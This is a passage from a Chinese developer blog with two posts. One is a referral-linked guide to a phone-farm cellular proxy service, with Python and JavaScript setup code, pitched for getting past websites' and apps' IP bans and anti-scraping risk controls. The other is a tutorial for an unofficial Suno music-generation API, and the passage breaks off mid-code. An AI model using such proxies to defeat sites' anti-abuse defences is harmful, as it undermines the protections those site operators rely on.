                  <span class="post-meta-item-text">阅读次数：</span>
                  <span class="leancloud-visitors-count"></span>
                </span>
                <span class="post-meta-item" title="本文字数">
                  <span class="post-meta-item-icon">
                    <i class="far fa-file-word"></i>
                  </span>
                  <span class="post-meta-item-text">本文字数：</span>
                  <span>2.6k</span>
                </span>
                <span class="post-meta-item" title="阅读时长">
                  <span class="post-meta-item-icon">
                    <i class="far fa-clock"></i>
                  </span>
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                  <span>2 分钟</span>
                </span>
              </div>
            </article>
            <article itemscope itemtype="http://schema.org/Article" class="post-block index" lang="zh-CN">
              <link itemprop="mainEntityOfPage" href="https://cuiqingcai.com/42367.html">
              <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
                <meta itemprop="image" content="/images/avatar.png">
                <meta itemprop="name" content="崔庆才">
                <meta itemprop="description" content="静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。">
              </span>
              <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
                <meta itemprop="name" content="静觅">
              </span>
              <header class="post-header">
                <h2 class="post-title" itemprop="name headline">
                  <a class="label"> Python <i class="label-arrow"></i>
                  </a>
                  <a href="/42367.html" class="post-title-link" itemprop="url">移动蜂窝代理对接说明</a>
                </h2>
              </header>
              <div class="post-body" itemprop="articleBody">
                <div class="thumb">
                  <img itemprop="contentUrl" class="random">
                </div>
                <div class="excerpt">
                  <p>
                  <p>在爬虫与反爬虫斗争愈演愈烈的情况下，各大网站和 App 的风控检测越来越强，其中一项就是 IP 封禁。</p>
                  <p>为了解决 IP 封禁的困扰，一个有效的方式就是设置代理，设置代理之后，爬虫可以借助代理的 IP 来伪装自己的真实 IP 地址，从而突破反爬虫的限制。</p>
                  <p>但代理的质量有高有低，比如市面上的免费代理，几乎绝大多数都是不可用或者被封禁的状态，而有些付费普通代理也陆续被加入了各大网站和 App 的风控黑名单。因此，现在可以用作高质量数据爬爬取的代理越来越少了，目前市面上质量较高的代理主要有独享代理、ADSL 代理、移动蜂窝代理这几种类型。</p>
                  <p>本代理服务就是基于移动蜂窝网络（4G、5G）的隧道代理服务，本文档会介绍此服务的申请和使用方法。</p>
                  <h2 id="移动蜂窝代理"><a href="#移动蜂窝代理" class="headerlink" title="移动蜂窝代理"></a>移动蜂窝代理</h2>
                  <p>移动蜂窝代理，其实就是基于手机流量搭建的代理服务，所有的代理 IP 都是手机真实的 IP。此种代理在爬虫领域使用相对较少，因此被封禁的概率也更小，所以此种代理对于爬取一些风控极强的网站和 App 的爬取有很好的效果。</p>
                  <p>本代理服务背后是基于一个大规模的群控手机池搭建的代理服务，所有流量都经由纯正的手机流量转发，支持市面上几乎所有网站和 App 的数据请求，代理质量极高，能够极大减小风控概率。</p>
                  <h2 id="申请方法"><a href="#申请方法" class="headerlink" title="申请方法"></a>申请方法</h2>
                  <p>要使用蜂窝代理服务，可以首先到「<a href="https://platform.acedata.cloud/services/d8570fa7-8510-454e-913e-f1bd1b98338d?inviter_id=aef91f35-f7f9-494d-bcf6-3a533440101f" target="_blank" rel="noopener">申请页面</a>」进行申请，首次申请有 1 积分免费额度，约 17.5MB。</p>
                  <p><img src="https://cdn.acedata.cloud/wed8yf.png" alt=""></p>
                  <p>如果您尚未登录，则会自动跳转到登录页面，登录之后继续申请即可。</p>
                  <h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2>
                  <p>申请完毕之后，可以到「控制台」中查看本人的申请结果，如图所示：</p>
                  <p><img src="https://cdn.acedata.cloud/db1js5.png" alt=""></p>
                  <p>点击 「Credentails」，即可查看使用蜂窝代理服务的用户名及密码，以冒号分隔，其中用户名是 8 位，密码是 32 位，如图所示：</p>
                  <p><img src="https://cdn.acedata.cloud/54ffp0.png" alt=""></p>
                  <p>本移动蜂窝代理是一种隧道代理，因此使用的时候只需要设置一个固定的代理隧道即可，代理隧道的地址和端口分别是 cellular.proxy.acedata.cloud 和 30000，是 HTTP/HTTPS/SOCKS 协议的代理隧道，但此代理隧道可以用于爬取 HTTP 和 HTTPS 协议的网站。</p>
                  <p>下面以 Python 为例演示该代理隧道的设置方法：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">proxy = <span class="string">'https://&#123;proxy_username&#125;:&#123;proxy_password&#125;@cellular.proxy.acedata.cloud:30000'</span></span><br><span class="line"></span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">'http'</span>: proxy,</span><br><span class="line">    <span class="string">'https'</span>: proxy</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">    resp = requests.get(<span class="string">'http://myip.ipip.net'</span>, proxies=proxies)</span><br><span class="line">    print(resp.text)</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这里我们首先声明了代理的 URL 并定义为 proxy 变量，协议是 http 协议，后面跟随隧道代理的用户名和密码（即控制台展示的用户名和密码，二者以冒号分隔），后面再跟一个 <code>@</code> 符号，再跟代理的地址和端口即可。</p>
                  <p>接着声明了一个 prixies 变量，配置了两个键值对，键名分别为 http 和 https，其键值都是 proxy，代表对于 HTTP 和 HTTPS 协议的网站，都是用 proxy 变量定义的代理来进行请求。</p>
                  <p>接下来定义了三次循环进行代理的测试，这里请求的 URL 是 <a href="http://myip.ipip.net" target="_blank" rel="noopener" title="http://myip.ipip.net">http://myip.ipip.net</a>，这个站点可以返回请求该站点的真实 IP 地址和 IP 所在地域。</p>
                  <p>运行结果如下：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">当前 IP：<span class="number">60.27</span><span class="number">.158</span><span class="number">.243</span>  来自于：中国 天津 天津  联通</span><br><span class="line">当前 IP：<span class="number">116.130</span><span class="number">.209</span><span class="number">.234</span>  来自于：中国 天津 天津  联通</span><br><span class="line">当前 IP：<span class="number">221.197</span><span class="number">.232</span><span class="number">.211</span>  来自于：中国 天津 天津  联通</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>可以看到，每次运行的结果得到的代理 IP 都是随机的，而且 IP 所在地域确实是来源于真实手机流量（中国联通）。</p>
                  <p>当然，上述的代理设置方式实际上是一个相对简洁的设置方式。</p>
                  <p>实际上上述代码等价于在请求的时候设置了一个额外的 Headers - Proxy Authorization，所以上述代码还可以改写如下：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">proxy_host = <span class="string">'cellular.proxy.acedata.cloud'</span></span><br><span class="line">proxy_port = <span class="string">'30000'</span></span><br><span class="line">proxy_username = <span class="string">'&#123;proxy_username&#125;'</span> <span class="comment"># 8位用户名</span></span><br><span class="line">proxy_password = <span class="string">'&#123;proxy_password&#125;'</span> <span class="comment"># 32位密码</span></span><br><span class="line"></span><br><span class="line">credentials = base64.b64encode(</span><br><span class="line">    <span class="string">f'<span class="subst">&#123;proxy_username&#125;</span>:<span class="subst">&#123;proxy_password&#125;</span>'</span>.encode()).decode()</span><br><span class="line"></span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">'http'</span>: <span class="string">f'http://<span class="subst">&#123;proxy_host&#125;</span>:<span class="subst">&#123;proxy_port&#125;</span>'</span>,</span><br><span class="line">    <span class="string">'https'</span>: <span class="string">f'http://<span class="subst">&#123;proxy_host&#125;</span>:<span class="subst">&#123;proxy_port&#125;</span>'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'Proxy-Authorization'</span>: <span class="string">f'Basic <span class="subst">&#123;credentials&#125;</span>'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">    resp = requests.get(<span class="string">'http://myip.ipip.net'</span>,</span><br><span class="line">                        proxies=proxies, headers=headers)</span><br><span class="line">    print(resp.text)</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>可以看到，这里我们通过 Proxy-Authorization 这个请求头额外设置了代理的用户名和密码（需要进行 Base64 编码），这样的代码运行效果也是一样的。</p>
                  <p>对于其他语言，比如 JavaScript 的 axios，也可以使用类似的设置方式：</p>
                  <figure class="highlight javascript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">const</span> axios = <span class="built_in">require</span>(<span class="string">'axios'</span>);</span><br><span class="line"><span class="keyword">const</span> base64 = <span class="built_in">require</span>(<span class="string">'base64'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> proxy_host = <span class="string">'cellular.proxy.acedata.cloud'</span>;</span><br><span class="line"><span class="keyword">const</span> proxy_port = <span class="string">'30000'</span>;</span><br><span class="line"><span class="keyword">const</span> proxy_username = <span class="string">'&#123;proxy_username&#125;'</span>; <span class="comment">// 8位用户名</span></span><br><span class="line"><span class="keyword">const</span> proxy_password = <span class="string">'&#123;proxy_password&#125;'</span>; <span class="comment">// 32位密码</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> credentials = base64.encode(<span class="string">`<span class="subst">$&#123;proxy_username&#125;</span>:<span class="subst">$&#123;proxy_password&#125;</span>`</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> proxies = &#123;</span><br><span class="line">    http: <span class="string">`http://<span class="subst">$&#123;proxy_host&#125;</span>:<span class="subst">$&#123;proxy_port&#125;</span>`</span>,</span><br><span class="line">    https: <span class="string">`http://<span class="subst">$&#123;proxy_host&#125;</span>:<span class="subst">$&#123;proxy_port&#125;</span>`</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> headers = &#123;</span><br><span class="line">    <span class="string">'Proxy-Authorization'</span>: <span class="string">`Basic <span class="subst">$&#123;credentials&#125;</span>`</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">    axios.get(<span class="string">'http://myip.ipip.net'</span>, &#123; proxies, headers &#125;)</span><br><span class="line">        .then(<span class="function"><span class="params">resp</span> =&gt;</span> <span class="built_in">console</span>.log(resp.data))</span><br><span class="line">        .catch(<span class="function"><span class="params">err</span> =&gt;</span> <span class="built_in">console</span>.error(err));</span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>运行效果都是一样的。</p>
                  <p>对于其他语言的设置方法，请参考上文自行改写。</p>
                  <h2 id="购买更多"><a href="#购买更多" class="headerlink" title="购买更多"></a>购买更多</h2>
                  <p>如您的套餐已经耗尽，您需要购买更多才能继续使用该代理服务。</p>
                  <p>要购买更多，请到「<a href="https://platform.acedata.cloud/services/d8570fa7-8510-454e-913e-f1bd1b98338d?inviter_id=aef91f35-f7f9-494d-bcf6-3a533440101f" target="_blank" rel="noopener">申请页面</a>」直接点击「购买更多」按钮即可选购，1 Credit 约 17.5 MB，单次购买更多，单价越便宜，如图所示：</p>
                  <p><img src="https://cdn.acedata.cloud/4la8rd.png" alt=""></p>
                  </p>
                </div>
              </div>
              <div class="post-meta">
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-user"></i>
                  </span>
                  <span class="post-meta-item-text">作者</span>
                  <span><a href="/authors/崔庆才" class="author" itemprop="url" rel="index">崔庆才</a></span>
                </span>
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-calendar"></i>
                  </span>
                  <span class="post-meta-item-text">发表于</span>
                  <time title="创建时间：2024-05-31 00:41:06" itemprop="dateCreated datePublished" datetime="2024-05-31T00:41:06+08:00">2024-05-31</time>
                </span>
                <span id="/42367.html" class="post-meta-item leancloud_visitors" data-flag-title="移动蜂窝代理对接说明" title="阅读次数">
                  <span class="post-meta-item-icon">
                    <i class="fa fa-eye"></i>
                  </span>
                  <span class="post-meta-item-text">阅读次数：</span>
                  <span class="leancloud-visitors-count"></span>
                </span>
                <span class="post-meta-item" title="本文字数">
                  <span class="post-meta-item-icon">
                    <i class="far fa-file-word"></i>
                  </span>
                  <span class="post-meta-item-text">本文字数：</span>
                  <span>3.3k</span>
                </span>
                <span class="post-meta-item" title="阅读时长">
                  <span class="post-meta-item-icon">
                    <i class="far fa-clock"></i>
                  </span>
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                  <span>3 分钟</span>
                </span>
              </div>
            </article>
            <article itemscope itemtype="http://schema.org/Article" class="post-block index" lang="zh-CN">
              <link itemprop="mainEntityOfPage" href="https://cuiqingcai.com/42348.html">
              <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
                <meta itemprop="image" content="/images/avatar.png">
                <meta itemprop="name" content="崔庆才">
                <meta itemprop="description" content="静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。">
              </span>
              <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
                <meta itemprop="name" content="静觅">
              </span>
              <header class="post-header">
                <h2 class="post-title" itemprop="name headline">
                  <a class="label"> 人工智能 <i class="label-arrow"></i>
                  </a>
                  <a href="/42348.html" class="post-title-link" itemprop="url">Suno API 的申请及使用</a>
                </h2>
              </header>
              <div class="post-body" itemprop="articleBody">
                <div class="thumb">
                  <img itemprop="contentUrl" class="random">
                </div>
                <div class="excerpt">
                  <p>
                  <p>随着 AI 的应用变广，各类 AI 程序已逐渐普及。AI 已逐渐深入到人们的工作生活方方面面。而 AI 涉及的行业也越来越多，从最初的写作，到医疗教育，再到现在的音乐。</p>
                  <p>Suno 是一个专业高质量的 AI 歌曲和音乐创作平台，用户只需输入简单的文本提示词，即可根据流派风格和歌词生成带有人声的歌曲。该 AI 音乐生成器由来自 Meta、TikTok、Kensho 等知名科技公司的团队成员开发，目标是不需要任何乐器工具，让所有人都可以创造美妙的音乐。</p>
                  <p>Suno 最新已将音乐生成模型升级到 V3 版本，可生成 2 分钟的歌曲。</p>
                  <p>然而 Suno 官方是并没有提供 API 的，AceDataCloud 提供了一套 Suno 的 API，模拟对接了 Suno 官方，可以方便快捷地生成想要的音乐。</p>
                  <h2 id="申请和使用"><a href="#申请和使用" class="headerlink" title="申请和使用"></a>申请和使用</h2>
                  <p>要使用 Suno Audios API，首先可以到 <a href="https://platform.acedata.cloud/documents/4da95d9d-7722-4a72-857d-bf6be86036e9?inviter_id=aef91f35-f7f9-494d-bcf6-3a533440101f" target="_blank" rel="noopener">Suno Audios Generation API</a> 页面点击「Acquire」按钮，获取请求所需要的凭证：</p>
                  <p><img src="https://cdn.acedata.cloud/nyq0xz.png" alt=""></p>
                  <p>如果你尚未登录或注册，会自动跳转到登录页面邀请您来注册和登录，登录注册之后会自动返回当前页面。</p>
                  <p>在首次申请时会有免费额度赠送，可以免费使用该 API。</p>
                  <h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2>
                  <p>想些什么歌曲，可以任意输入一段文字，比如我想生成一个关于圣诞的歌曲，就可以输入 <code>a song for Christmas</code>，如图所示：</p>
                  <p><img src="https://cdn.acedata.cloud/tsragd.png" alt=""></p>
                  <p>生成的代码如下：</p>
                  <p><img src="https://cdn.acedata.cloud/ohgrs3.png" alt=""></p>
                  <p>可以点击「Try」按钮直接测试 API，稍等 1-2 分钟，结果如下：</p>
                  <figure class="highlight json">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"success"</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">"data"</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"id"</span>: <span class="string">"2f16f7bc-4135-42c6-b3c5-6d6c49dc8cd5"</span>,</span><br><span class="line">      <span class="attr">"title"</span>: <span class="string">"Winter Wonderland"</span>,</span><br><span class="line">      <span class="attr">"image_url"</span>: <span class="string">"https://cdn1.suno.ai/image_2f16f7bc-4135-42c6-b3c5-6d6c49dc8cd5.png"</span>,</span><br><span class="line">      <span class="attr">"lyric"</span>: <span class="string">"[Verse]\nSnowflakes falling all around\nGlistening white\nCovering the ground\nChildren laughing\nFull of delight\nIn this winter wonderland tonight\nSanta's sleigh\nUp in the sky\nRudolph's nose shining bright\nOh my\nHear the jingle bells\nRinging so clear\nBringing joy and holiday cheer\n[Verse 2]\nRoasting chestnuts by the fire's glow\nChristmas lights\nThey twinkle and show\nFamilies gathering with love and cheer\nSpreading warmth to everyone near"</span>,</span><br><span class="line">      <span class="attr">"audio_url"</span>: <span class="string">"https://cdn1.suno.ai/2f16f7bc-4135-42c6-b3c5-6d6c49dc8cd5.mp3"</span>,</span><br><span class="line">      <span class="attr">"video_url"</span>: <span class="string">"https://cdn1.suno.ai/2f16f7bc-4135-42c6-b3c5-6d6c49dc8cd5.mp4"</span>,</span><br><span class="line">      <span class="attr">"created_at"</span>: <span class="string">"2024-05-10T16:21:37.624Z"</span>,</span><br><span class="line">      <span class="attr">"model"</span>: <span class="string">"chirp-v3"</span>,</span><br><span class="line">      <span class="attr">"prompt"</span>: <span class="string">"A song for Christmas"</span>,</span><br><span class="line">      <span class="attr">"style"</span>: <span class="string">"holiday"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"id"</span>: <span class="string">"5dca232b-17cc-4896-a2d1-4b59178bf410"</span>,</span><br><span class="line">      <span class="attr">"title"</span>: <span class="string">"Winter Wonderland"</span>,</span><br><span class="line">      <span class="attr">"image_url"</span>: <span class="string">"https://cdn1.suno.ai/image_5dca232b-17cc-4896-a2d1-4b59178bf410.png"</span>,</span><br><span class="line">      <span class="attr">"lyric"</span>: <span class="string">"[Verse]\nSnowflakes falling all around\nGlistening white\nCovering the ground\nChildren laughing\nFull of delight\nIn this winter wonderland tonight\nSanta's sleigh\nUp in the sky\nRudolph's nose shining bright\nOh my\nHear the jingle bells\nRinging so clear\nBringing joy and holiday cheer\n[Verse 2]\nRoasting chestnuts by the fire's glow\nChristmas lights\nThey twinkle and show\nFamilies gathering with love and cheer\nSpreading warmth to everyone near"</span>,</span><br><span class="line">      <span class="attr">"audio_url"</span>: <span class="string">"https://cdn1.suno.ai/5dca232b-17cc-4896-a2d1-4b59178bf410.mp3"</span>,</span><br><span class="line">      <span class="attr">"video_url"</span>: <span class="string">"https://cdn1.suno.ai/5dca232b-17cc-4896-a2d1-4b59178bf410.mp4"</span>,</span><br><span class="line">      <span class="attr">"created_at"</span>: <span class="string">"2024-05-10T16:21:37.624Z"</span>,</span><br><span class="line">      <span class="attr">"model"</span>: <span class="string">"chirp-v3"</span>,</span><br><span class="line">      <span class="attr">"prompt"</span>: <span class="string">"A song for Christmas"</span>,</span><br><span class="line">      <span class="attr">"style"</span>: <span class="string">"holiday"</span></span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>可以看到这时候我们就得到了两首歌的内容，包括标题、预览图、歌词、音频、视频等内容。</p>
                  <p>字段说明如下：</p>
                  <ul>
                    <li>success：生成是否成功，如果成功则为 <code>true</code>，否则为 <code>false</code></li>
                    <li>data：是一个列表，包含了生成的歌曲的详细信息。<ul>
                        <li>id：歌曲 ID</li>
                        <li>title：歌曲的标题</li>
                        <li>image_url：歌曲的封面图片</li>
                        <li>lyric：歌曲的歌词</li>
                        <li>audio_url：歌曲的音频文件，打开就是一个 mp3 音频。</li>
                        <li>video_url：歌曲的视频文件，打开就是一个 mp4 视频。</li>
                        <li>created_at：创建的时间</li>
                        <li>model：使用的模型，一般是最新的 v3 模型</li>
                        <li>style：风格</li>
                      </ul>
                    </li>
                  </ul>
                  <h2 id="自定义生成"><a href="#自定义生成" class="headerlink" title="自定义生成"></a>自定义生成</h2>
                  <p>如果想自定义生成歌词，可以输入歌词：</p>
                  <p>这时候 <code>lyric</code> 字段可以传入类似如下内容：</p>
                  <figure class="highlight tex">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">[Verse]<span class="tag">\<span class="name">nSnowflakes</span></span> falling all around<span class="tag">\<span class="name">nGlistening</span></span> white<span class="tag">\<span class="name">nCovering</span></span> the ground<span class="tag">\<span class="name">nChildren</span></span> laughing<span class="tag">\<span class="name">nFull</span></span> of delight<span class="tag">\<span class="name">nIn</span></span> this winter wonderland tonight<span class="tag">\<span class="name">nSanta</span></span>'s sleigh<span class="tag">\<span class="name">nUp</span></span> in the sky<span class="tag">\<span class="name">nRudolph</span></span>'s nose shining bright<span class="tag">\<span class="name">nOh</span></span> my<span class="tag">\<span class="name">nHear</span></span> the jingle bells<span class="tag">\<span class="name">nRinging</span></span> so clear<span class="tag">\<span class="name">nBringing</span></span> joy and holiday cheer<span class="tag">\<span class="name">n</span><span class="string">[Verse 2]</span></span><span class="tag">\<span class="name">nRoasting</span></span> chestnuts by the fire's glow<span class="tag">\<span class="name">nChristmas</span></span> lights<span class="tag">\<span class="name">nThey</span></span> twinkle and show<span class="tag">\<span class="name">nFamilies</span></span> gathering with love and cheer<span class="tag">\<span class="name">nSpreading</span></span> warmth to everyone near</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <blockquote>
                    <p>注意，这里的歌词中 <code>\n</code> 是换行符，如果你不知道如何生成歌词，可以使用下文介绍的生成歌词的 API 自助生成。</p>
                  </blockquote>
                  <p>接下来我们要根据歌词、标题、风格自定义生成歌曲，就可以指定如下内容：</p>
                  <ul>
                    <li>lyric：歌词文本</li>
                    <li>custom：填写为 <code>true</code>，代表自定义生成，该参数默认为 false，代表使用 <code>prompt</code> 生成。</li>
                    <li>file：歌曲的标题。</li>
                    <li>style：歌曲的风格，选填。</li>
                  </ul>
                  <p>填写样例如下：</p>
                  <p><img src="https://cdn.acedata.cloud/quw76r.png" alt="image-20240511005847578"></p>
                  <p>填写完毕之后自动生成了代码如下：</p>
                  <p><img src="https://cdn.acedata.cloud/d1jv3i.png" alt=""></p>
                  <p>对应的代码：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">curl -X POST <span class="string">'https://api.acedata.cloud/suno/audios'</span> \</span><br><span class="line">-H <span class="string">'authorization: Bearer &#123;token&#125;'</span> \</span><br><span class="line">-H <span class="string">'accept: application/json'</span> \</span><br><span class="line">-H <span class="string">'content-type: application/json'</span> \</span><br><span class="line">-d <span class="string">'&#123;</span></span><br><span class="line"><span class="string">"lyric": "[Verse]\\nSnowflakes falling all around\\nGlistening white\\nCovering the ground\\nChildren laughing\\nFull of delight\\nIn this winter wonderland tonight\\nSanta'</span>s sleigh\\nUp <span class="keyword">in</span> the sky\\nRudolph<span class="string">'s nose shining bright\\nOh my\\nHear the jingle bells\\nRinging so clear\\nBringing joy and holiday cheer\\n[Verse 2]\\nRoasting chestnuts by the fire'</span>s glow\\nChristmas lights\\nThey twinkle <span class="keyword">and</span> show\\nFamilies gathering <span class="keyword">with</span> love <span class="keyword">and</span> cheer\\nSpreading warmth to everyone nea<span class="string">r",</span></span><br><span class="line"><span class="string">"</span>custom<span class="string">": true</span></span><br><span class="line"><span class="string">&#125;'</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>测试允许，生成的效果是类似的。</p>
                  <h2 id="异步回调"><a href="#异步回调" class="headerlink" title="异步回调"></a>异步回调</h2>
                  <p>由于 Suno 生成音乐的时间相对较长，大约需要 1-2 分钟，如果 API 长时间无响应，HTTP 请求会一直保持连接，导致额外的系统资源消耗，所以本 API 也提供了异步回调的支持。</p>
                  <p>整体流程是：客户端发起请求的时候，额外指定一个 <code>callback_url</code> 字段，客户端发起 API 请求之后，API 会立马返回一个结果，包含一个 <code>task_id</code> 的字段信息，代表当前的任务 ID。当任务完成之后，生成音乐的结果会通过 POST JSON 的形式发送到客户端指定的 <code>callback_url</code>，其中也包括了 <code>task_id</code> 字段，这样任务结果就可以通过 ID 关联起来了。</p>
                  <p>下面我们通过示例来了解下具体怎样操作。</p>
                  <p>首先，Webhook 回调是一个可以接收 HTTP 请求的服务，开发者应该替换为自己搭建的 HTTP 服务器的 URL。此处为了方便演示，使用一个公开的 Webhook 样例网站 <a href="https://webhook.site/，打开该网站即可得到一个" target="_blank" rel="noopener">https://webhook.site/，打开该网站即可得到一个</a> Webhook URL，如图所示：</p>
                  <p><img src="https://cdn.acedata.cloud/fwfqin.png" alt=""></p>
                  <p>将此 URL 复制下来，就可以作为 Webhook 来使用，此处的样例为 <a href="https://webhook.site/03e60575-3d96-4132-b681-b713d78116e2。" target="_blank" rel="noopener">https://webhook.site/03e60575-3d96-4132-b681-b713d78116e2。</a></p>
                  <p>接下来，我们可以设置字段 <code>callback_url</code> 为上述 Webhook URL，同时填入 <code>prompt</code>，如图所示：</p>
                  <p><img src="https://cdn.acedata.cloud/x8xql1.png" alt=""></p>
                  <p>点击运行，可以发现会立即得到一个结果，如下：</p>
                  <figure class="highlight json">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"task_id"</span>: <span class="string">"44472ab8-783b-4054-b861-5bf14e462f60"</span></span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>稍等片刻，我们可以在 <a href="https://webhook.site/03e60575-3d96-4132-b681-b713d78116e2" target="_blank" rel="noopener">https://webhook.site/03e60575-3d96-4132-b681-b713d78116e2</a> 上观察到生成歌曲的结果，如图所示：</p>
                  <p><img src="https://cdn.acedata.cloud/f9kosb.png" alt=""></p>
                  <p>内容如下：</p>
                  <figure class="highlight json">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre>
                        </td>
                        <td class="code">
